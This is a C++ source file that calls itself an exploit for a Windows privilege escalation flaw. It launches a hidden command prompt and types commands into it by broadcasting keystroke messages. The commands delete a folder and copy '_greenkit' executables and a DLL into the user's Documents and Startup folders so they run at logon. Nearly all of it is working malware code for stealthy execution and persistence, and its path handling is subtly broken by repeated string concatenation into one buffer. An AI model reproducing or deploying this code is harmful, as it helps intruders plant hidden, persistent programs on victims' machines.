// Microsoft Windows 57135 Remote Privilege Escalation Vulnerability
#include "stdafx.h"
#include "Infiltration.h"
#include <windows.h>
#include <fstream>

int CheckFileExists(TCHAR * file)
{
	WIN32_FIND_DATA FindFileData;
	HANDLE handle = FindFirstFile(file, &FindFileData);
	int found = handle != INVALID_HANDLE_VALUE;
	if (found)
	{
		FindClose(handle);
	}
	return found;
}

bool is_file_exist(const char *fileName)
{
	std::ifstream infile(fileName);
	bool res = infile.good();
	infile.close();
	return res;
}

void RunExploit()
{
	STARTUPINFOA si;
	PROCESS_INFORMATION pi = { 0 };

	memset(&si, 0, sizeof(si));
	si.cb = sizeof(STARTUPINFOA);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;

	char profilepath[250];
	ExpandEnvironmentStringsA("%userprofile%", profilepath, 250);

	char* exploit_path = strcat(profilepath, "\\Documents\\_greenkit_folder\\_greenkit_Exploit.exe");

	si.cb = sizeof(si);
	CreateProcessA(
		NULL,
		exploit_path,
		NULL,
		NULL,
		FALSE,
		CREATE_NEW_CONSOLE,
		NULL,
		"C:\\",
		&si,
		&pi
		);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	TerminateProcess(pi.hProcess, 0);
}

void PleaseSendMessage(PCHAR str)
{
	for (unsigned int j = 0; j < strlen(str); ++j)
	{
		Sleep(10);
		SendMessage(
			HWND_BROADCAST,
			WM_CHAR,
			str[j],
			0
			);
	}
	Sleep(1000);

	SendMessage(
		HWND_BROADCAST,
		WM_CHAR,
		VK_RETURN,
		0
		);
}

int ExploitME()
{
	STARTUPINFOA si;
	PROCESS_INFORMATION pi = { 0 };

	memset(&si, 0, sizeof(si));
	si.cb = sizeof(STARTUPINFOA);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;

	si.cb = sizeof(si);
	CreateProcessA(
		NULL,
		"C:\\Windows\\system32\\cmd.exe",
		NULL,
		NULL,
		FALSE,
		CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&si,
		&pi
		);

	Sleep(1000);
	
	PleaseSendMessage("rmdir /S /Q %USERPROFILE%\\Documents\\_greenkit_folder");

	char* cmd[] = { "xcopy _greenkit_Exploit.exe %USERPROFILE%\\Documents\\_greenkit_folder\\",
		"xcopy _greenkit_GreenKitExe.exe %USERPROFILE%\\Documents\\_greenkit_folder\\",
		"xcopy _greenkit_GreenKit.dll %USERPROFILE%\\Documents\\_greenkit_folder\\",
		"xcopy _greenkit_Exploit.exe \"%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"",
		NULL };

	char profilepath[250];
	ExpandEnvironmentStringsA("%userprofile%", profilepath, 250);

	wchar_t* copy[] = {(wchar_t*)strcat(profilepath, "\\Documents\\_greenkit_folder\\_greenkit_Exploit.exe"),
			(wchar_t*)strcat(profilepath, "\\Documents\\_greenkit_folder\\_greenkit_GreenKitExe.exe"),
			(wchar_t*)strcat(profilepath, "\\Documents\\_greenkit_folder\\_greenkit_GreenKit.dll"),
			(wchar_t*)strcat(profilepath,"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\_greenkit_Exploit.exe"),
			NULL};

	for (unsigned int i = 0; copy[i] != NULL; ++i)
	{
		//while (!CheckFileExists(copy[i]))
			PleaseSendMessage(cmd[i]);
	}

	PleaseSendMessage("exit");

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	TerminateProcess(pi.hProcess, 0);

	return EXIT_SUCCESS;
}

